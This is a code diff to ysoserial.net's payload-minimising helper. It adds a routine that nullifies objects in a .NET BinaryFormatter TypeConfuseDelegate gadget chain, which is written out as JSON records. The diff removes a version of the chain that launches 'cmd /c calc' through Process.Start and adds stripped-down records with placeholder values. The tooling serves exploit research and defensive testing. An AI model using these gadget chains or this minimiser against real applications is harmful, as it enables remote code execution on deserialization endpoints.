@@ -35,7 +35,7 @@ namespace ysoserial.Helpers.TestingArena
         {
             this.inputArgs = inputArgs;
             //ManualTCDGPayload4Minifying();
-            MinimiseTCDJsonAndRun();
+            //MinimiseTCDJsonAndRun();
             Console.ReadLine();
         }
 
@@ -106,7 +106,14 @@ namespace ysoserial.Helpers.TestingArena
 
                 StringBuilder sbSuccessResult = new StringBuilder();
 
+                List<String> valueExclusionList = new List<string> { inInputArgs.CmdFullString, inInputArgs.CmdFileName, inInputArgs.CmdArguments, inInputArgs.CmdFromFile };
+                List<String> typeExclusionList = new List<string> { "SerializationHeaderRecord", "MessageEnd" };
+                List<String> nameExclusionList = new List<string> { "$type", "objectId" };
+
                 sbSuccessResult.Append(DataObjectRemovalTester(ref jsonJArrayObj, myApp, isErrOk));
+
+                sbSuccessResult.Append(DataObjectNullifyTester(ref jsonJArrayObj, myApp, isErrOk, valueExclusionList));
+                
                 // TODO: do we need to repeat object removal? and all this? if yes, can we do it recursively by just calling this funcion?
 
                 // replace a string with null
@@ -115,10 +122,7 @@ namespace ysoserial.Helpers.TestingArena
                 // replace space in string if it contains a space
                 // replace a full class or assembly string to only keep class - then class and assembly
                 // replace an integer with 0 to N - when int is M and N < M && N < 20 (we need a limit)
-                List<String> typeExclusionList = new List<string> { "SerializationHeaderRecord", "MessageEnd" };
-                List<String> nameExclusionList = new List<string> { "$type", "objectId" };
-                List<String> valueExclusionList = new List<string> { inInputArgs.CmdFullString, inInputArgs.CmdFileName, inInputArgs.CmdArguments, inInputArgs.CmdFromFile };
-
+                
                 JArray origJsonJArrayObj = new JArray(jsonJArrayObj.ToList().ToArray());
                 bool ruleComplete = false;
                 while (!ruleComplete)
@@ -149,7 +153,14 @@ namespace ysoserial.Helpers.TestingArena
                                 }
                             }
 
-                            if (nameExclusionList.Contains(subDataItemName) || valueExclusionList.Contains(subDataItemValue.ToString()))
+                            string subDataItemValueStringValue = "";
+
+                            if (item["Data"]["value"] != null)
+                            {
+                                subDataItemValueStringValue = (string) item["Data"]["value"];
+                            }
+
+                            if (nameExclusionList.Contains(subDataItemName) || valueExclusionList.Contains(subDataItemValueStringValue))
                                 continue;
 
                             switch (subDataItemType)
@@ -261,7 +272,7 @@ namespace ysoserial.Helpers.TestingArena
             bool ruleComplete = false;
 
             StringBuilder sbSuccessResult = new StringBuilder();
-
+            
             // remove a Data object
             ruleComplete = false;
             int externalCounter = 0;
@@ -290,9 +301,31 @@ namespace ysoserial.Helpers.TestingArena
 
                     if (!ruleComplete && internalCounter > externalCounter)
                     {
+                        var currentObjId = item["Data"]["objectId"];
+                        
                         string tempValue = item.ToString();
                         item.Remove();
 
+                        if (currentObjId != null)
+                        {
+                            // we want to remove objects that have idRef == objectId of our removed item
+                            List<JObject> refRremovalList = new List<JObject>();
+                            foreach (JObject otherItems in origJsonJArrayObj)
+                            {
+                                if (otherItems["Data"]["idRef"] != null)
+                                {
+                                    if ((int) otherItems["Data"]["idRef"] == (int) currentObjId)
+                                    {
+                                        refRremovalList.Add(otherItems);
+                                    }
+                                }
+                            }
+
+                            foreach (JObject refObject in refRremovalList)
+                            {
+                                refObject.Remove();
+                            }
+                        }
 
                         if (CheckIfSuccess(origJsonJArrayObj.ToString(), myApp, isErrOk))
                         {
@@ -301,6 +334,116 @@ namespace ysoserial.Helpers.TestingArena
                             externalCounter = 0;
                             jsonJArrayObj = new JArray(origJsonJArrayObj.ToList().ToArray());
                             sbSuccessResult.AppendLine("Successful in removing:" + tempValue);
+                        }
+                        else
+                        {
+                            // we should not remove it
+                            externalCounter = internalCounter;
+                            origJsonJArrayObj = new JArray(jsonJArrayObj.ToList().ToArray());
+                        }
+
+                        break;
+                    }
+                }
+            }
+
+
+            return sbSuccessResult;
+        }
+
+        private StringBuilder DataObjectNullifyTester(ref JArray jsonJArrayObj, string myApp, bool isErrOk, List<String> valueExclusionList)
+        {
+            
+            JArray origJsonJArrayObj = new JArray(jsonJArrayObj.ToList().ToArray());
+            string json_shortened = origJsonJArrayObj.ToString();
+            bool ruleComplete = false;
+
+            StringBuilder sbSuccessResult = new StringBuilder();
+
+            JObject nullJObject = JObject.Parse(@"{'Id': 0,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}}");
+            // remove a Data object
+            ruleComplete = false;
+            int externalCounter = 0;
+            while (!ruleComplete)
+            {
+                int internalCounter = 0;
+
+                foreach (JObject item in origJsonJArrayObj)
+                {
+                    internalCounter++;
+                    bool isExcluded = false;
+                    JToken dataItem = item["Data"];
+                    foreach (JProperty subDataItem in dataItem)
+                    {
+                        string subDataItemName = subDataItem.Name;
+                        JToken subDataItemValue = subDataItem.Value;
+                        JTokenType subDataItemType = subDataItem.Value.Type;
+                        if (subDataItemName.Equals("$type"))
+                        {
+                            if (subDataItemValue.ToString().Equals("MessageEnd"))
+                            {
+                                ruleComplete = true;
+                            }
+                            else if (subDataItemValue.ToString().Equals("ObjectNull"))
+                            {
+                                isExcluded = true;
+                            }
+                            break;
+                        }
+                    }
+
+                    string subDataItemValueStringValue = "";
+
+                    if (item["Data"]["value"] != null)
+                    {
+                        subDataItemValueStringValue = (string)item["Data"]["value"];
+                    }
+
+                    if (isExcluded || valueExclusionList.Contains(subDataItemValueStringValue))
+                        continue;
+
+                    if (!ruleComplete && internalCounter > externalCounter)
+                    {
+                        var currentObjId = item["Data"]["objectId"];
+
+                        string tempValue = item.ToString();
+                        item.AddAfterSelf(nullJObject);
+                        item.Remove();
+
+                        if (currentObjId != null)
+                        {
+                            // we want to remove objects that have idRef == objectId of our removed item
+                            List<JObject> refRremovalList = new List<JObject>();
+                            foreach (JObject otherItems in origJsonJArrayObj)
+                            {
+                                if (otherItems["Data"]["idRef"] != null)
+                                {
+                                    if ((int)otherItems["Data"]["idRef"] == (int)currentObjId)
+                                    {
+                                        refRremovalList.Add(otherItems);
+                                    }
+                                }
+                            }
+
+                            foreach (JObject refObject in refRremovalList)
+                            {
+                                refObject.AddAfterSelf(nullJObject);
+                                refObject.Remove();
+                            }
+                        }
+
+                        if (CheckIfSuccess(origJsonJArrayObj.ToString(), myApp, isErrOk))
+                        {
+                            // it is a success so we can remove it!
+                            // we have to start from the beginning!
+                            externalCounter = 0;
+                            jsonJArrayObj = new JArray(origJsonJArrayObj.ToList().ToArray());
+                            sbSuccessResult.AppendLine("Successful in nullifying:" + tempValue);
                         }
                         else
                         {
@@ -716,7 +859,7 @@ namespace ysoserial.Helpers.TestingArena
     'Data': {
       '$type': 'BinaryAssembly',
       'assemId': 2,
-      'assemblyString': 'System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'
+      'assemblyString': 'System'
 }},{'Id': 3,
     'TypeName': 'ObjectWithMapTypedAssemId',
     'Data': {
@@ -725,10 +868,10 @@ namespace ysoserial.Helpers.TestingArena
       'objectId': 1,
       'name': 'System.Collections.Generic.SortedSet`1[[System.String,mscorlib]]',
       'numMembers': 4,
-      'memberNames':['Count','Comparer','Version','Items'], /*Version can be replaced with an empty string but it causes error after code execution*/
-      'binaryTypeEnumA':[0,3,0,6],
-      'typeInformationA':[8,null,8,null],
-      'typeInformationB':[8,'', 8, null],
+      'memberNames':['Count','Comparer','Version','Items'],
+      'binaryTypeEnumA':[0,1,0,1],
+      'typeInformationA': null,
+      'typeInformationB':[8,null,8,null],
       'memberAssemIds':[0,0,0,0],
       'assemId': 2
 }},{'Id': 4,
@@ -749,7 +892,7 @@ namespace ysoserial.Helpers.TestingArena
     'Data': {
       '$type': 'MemberPrimitiveUnTyped',
       'typeInformation': 8,
-      'value': 2
+      'value': 0
 }},{'Id': 7,
     'TypeName': 'MemberReference',
     'Data': {
@@ -764,9 +907,9 @@ namespace ysoserial.Helpers.TestingArena
       'name': 'System.Collections.Generic.ComparisonComparer`1[[System.String]]',
       'numMembers': 1,
       'memberNames':['_comparison'],
-      'binaryTypeEnumA':[3],
-      'typeInformationA':[null],
-      'typeInformationB':[''],
+      'binaryTypeEnumA':[1],
+      'typeInformationA': null,
+      'typeInformationB':[null],
       'memberAssemIds':[0],
       'assemId': 0
 }},{'Id': 9,
@@ -779,10 +922,10 @@ namespace ysoserial.Helpers.TestingArena
     'Data': {
       '$type': 'BinaryArray',
       'objectId': 4,
-      'rank': 1,
+      'rank': 0,
       'lengthA':[2],
-      'lowerBoundA':[0],
-      'binaryTypeEnum': 1,
+      'lowerBoundA': null,
+      'binaryTypeEnum': 0,
       'typeInformation': null,
       'assemId': 0,
       'binaryHeaderEnum': 17,
@@ -792,13 +935,13 @@ namespace ysoserial.Helpers.TestingArena
     'Data': {
       '$type': 'BinaryObjectString',
       'objectId': 6,
-      'value': '/c calc'
+      'value': '/foo bar'
 }},{'Id': 12,
     'TypeName': 'ObjectString',
     'Data': {
       '$type': 'BinaryObjectString',
       'objectId': 7,
-      'value': 'cmd'
+      'value': 'TestConsoleApp'
 }},{'Id': 13,
     'TypeName': 'ObjectWithMapTyped',
     'Data': {
@@ -807,10 +950,10 @@ namespace ysoserial.Helpers.TestingArena
       'objectId': 5,
       'name': 'System.DelegateSerializationHolder',
       'numMembers': 3,
-      'memberNames':['Delegate','method0',''],
-      'binaryTypeEnumA':[3,3,3],
-      'typeInformationA':[null,null,null],
-      'typeInformationB':['','',''],
+      'memberNames':['Delegate','','x'],
+      'binaryTypeEnumA':[1,1,1],
+      'typeInformationA': null,
+      'typeInformationB':[null,null,null],
       'memberAssemIds':[0,0,0],
       'assemId': 0
 }},{'Id': 14,
@@ -818,16 +961,16 @@ namespace ysoserial.Helpers.TestingArena
     'Data': {
       '$type': 'MemberReference',
       'idRef': 8
-}},{'Id': 15,
-    'TypeName': 'MemberReference',
+}},{'Id': 0,
+    'TypeName': 'ObjectNull',
     'Data': {
-      '$type': 'MemberReference',
-      'idRef': 9
-}},{'Id': 16,
-    'TypeName': 'MemberReference',
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}},{'Id': 0,
+    'TypeName': 'ObjectNull',
     'Data': {
-      '$type': 'MemberReference',
-      'idRef': 10
+      '$type': 'ObjectNull',
+      'nullCount': 0
 }},{'Id': 17,
     'TypeName': 'ObjectWithMapTyped',
     'Data': {
@@ -837,9 +980,9 @@ namespace ysoserial.Helpers.TestingArena
       'name': 'System.DelegateSerializationHolder+DelegateEntry',
       'numMembers': 7,
       'memberNames':['type','assembly','','targetTypeAssembly','targetTypeName','methodName','delegateEntry'],
-      'binaryTypeEnumA':[1,1,2,1,1,1,3],
-      'typeInformationA':[null,null,null,null,null,null,null],
-      'typeInformationB':[null,null,null,null,null,null,''],
+      'binaryTypeEnumA':[1,1,1,1,1,1,1],
+      'typeInformationA': null,
+      'typeInformationB':[null,null,null,null,null,null,null],
       'memberAssemIds':[0,0,0,0,0,0,0],
       'assemId': 0
 }},{'Id': 18,
@@ -858,7 +1001,7 @@ namespace ysoserial.Helpers.TestingArena
     'TypeName': 'ObjectNull',
     'Data': {
       '$type': 'ObjectNull',
-      'nullCount': 1
+      'nullCount': 0
 }},{'Id': 21,
     'TypeName': 'ObjectString',
     'Data': {
@@ -888,126 +1031,129 @@ namespace ysoserial.Helpers.TestingArena
       '$type': 'BinaryObjectWithMapTyped',
       'binaryHeaderEnum': 4,
       'objectId': 9,
-      'name': 'System.Reflection.MemberInfoSerializationHolder',
-      'numMembers': 6,
-      'memberNames':['Name','AssemblyName','ClassName','Signature','MemberType',''],
-      'binaryTypeEnumA':[1,1,1,1,0,3],
-      'typeInformationA':[null,null,null,null,8,null],
-      'typeInformationB':[null,null,null,null,8,''
-],'memberAssemIds':[0,0,0,0,0,0],
+      'name': 'x',
+      'numMembers': 7,
+      'memberNames':['','','','','','',''],
+      'binaryTypeEnumA':[1,1,1,1,1,0,1],
+      'typeInformationA': null,
+      'typeInformationB':[null,null,null,null,null,8,null],
+      'memberAssemIds':[0,0,0,0,0,0,0],
       'assemId': 0
-}},{'Id': 26,
-    'TypeName': 'MemberReference',
+}},{'Id': 0,
+    'TypeName': 'ObjectNull',
     'Data': {
-      '$type': 'MemberReference',
-      'idRef': 15
-}},{'Id': 27,
-    'TypeName': 'MemberReference',
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}},{'Id': 0,
+    'TypeName': 'ObjectNull',
     'Data': {
-      '$type': 'MemberReference',
-      'idRef': 13
-}},{'Id': 28,
-    'TypeName': 'MemberReference',
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}},{'Id': 0,
+    'TypeName': 'ObjectNull',
     'Data': {
-      '$type': 'MemberReference',
-      'idRef': 14
-}},{'Id': 29,
-    'TypeName': 'ObjectString',
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}},{'Id': 0,
+    'TypeName': 'ObjectNull',
     'Data': {
-      '$type': 'BinaryObjectString',
-      'objectId': 20,
-      'value': 'System.Diagnostics.Process Start(System.String, System.String)'
-}},{'Id': 30,
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}},{'Id': 0,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}},{'Id': 31,
     'TypeName': 'Int32',
     'IsPrimitive': true,
     'Data': {
       '$type': 'MemberPrimitiveUnTyped',
       'typeInformation': 8,
-      'value': 8
-}},{'Id': 31,
-    'TypeName': 'ObjectNull',
-    'Data': {
-      '$type': 'ObjectNull',
-      'nullCount': 1
-}},{'Id': 32,
+      'value': 0
+}},{'Id': 33,
     'TypeName': 'Object',
     'Data': {
       '$type': 'BinaryObject',
       'objectId': 10,
       'mapId': 9
-}},{'Id': 33,
-    'TypeName': 'ObjectString',
-    'Data': {
-      '$type': 'BinaryObjectString',
-      'objectId': 21,
-      'value': 'Compare'
 }},{'Id': 34,
-    'TypeName': 'MemberReference',
-    'Data': {
-      '$type': 'MemberReference',
-      'idRef': 12
-}},{'Id': 35,
     'TypeName': 'ObjectString',
     'Data': {
       '$type': 'BinaryObjectString',
-      'objectId': 23,
-      'value': 'System.String'
+      'objectId': 22,
+      'value': 'Compare'
+}},{'Id': 0,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 0
 }},{'Id': 36,
     'TypeName': 'ObjectString',
     'Data': {
       '$type': 'BinaryObjectString',
       'objectId': 24,
-      'value': 'Int32 Compare(System.String, System.String)'
-}},{'Id': 37,
+      'value': 'System.String'
+}},{'Id': 0,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}},{'Id': 0,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}},{'Id': 39,
     'TypeName': 'Int32',
     'IsPrimitive': true,
     'Data': {
       '$type': 'MemberPrimitiveUnTyped',
       'typeInformation': 8,
-      'value': 8
-}},{'Id': 38,
+      'value': 0
+}},{'Id': 40,
     'TypeName': 'ObjectNull',
     'Data': {
       '$type': 'ObjectNull',
-      'nullCount': 1
-}},{'Id': 39,
+      'nullCount': 0
+}},{'Id': 41,
     'TypeName': 'Object',
     'Data': {
       '$type': 'BinaryObject',
       'objectId': 16,
       'mapId': 8
-}},{'Id': 40,
+}},{'Id': 42,
     'TypeName': 'ObjectString',
     'Data': {
       '$type': 'BinaryObjectString',
-      'objectId': 25,
+      'objectId': 27,
       'value': 'System.Comparison`1[[System.String]]'
-}},{'Id': 41,
-    'TypeName': 'MemberReference',
-    'Data': {
-      '$type': 'MemberReference',
-      'idRef': 12
-}},{'Id': 42,
-    'TypeName': 'ObjectNull',
-    'Data': {
-      '$type': 'ObjectNull',
-      'nullCount': 1
 }},{'Id': 43,
     'TypeName': 'MemberReference',
     'Data': {
       '$type': 'MemberReference',
       'idRef': 12
 }},{'Id': 44,
-    'TypeName': 'MemberReference',
+    'TypeName': 'ObjectNull',
     'Data': {
-      '$type': 'MemberReference',
-      'idRef': 23
+      '$type': 'ObjectNull',
+      'nullCount': 0
 }},{'Id': 45,
     'TypeName': 'MemberReference',
     'Data': {
       '$type': 'MemberReference',
-      'idRef': 21
+      'idRef': 12
+}},{'Id': 46,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 24
 }},{'Id': 47,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 22
+}},{'Id': 49,
     'TypeName': 'MessageEnd',
     'Data': {
       '$type': 'MessageEnd'
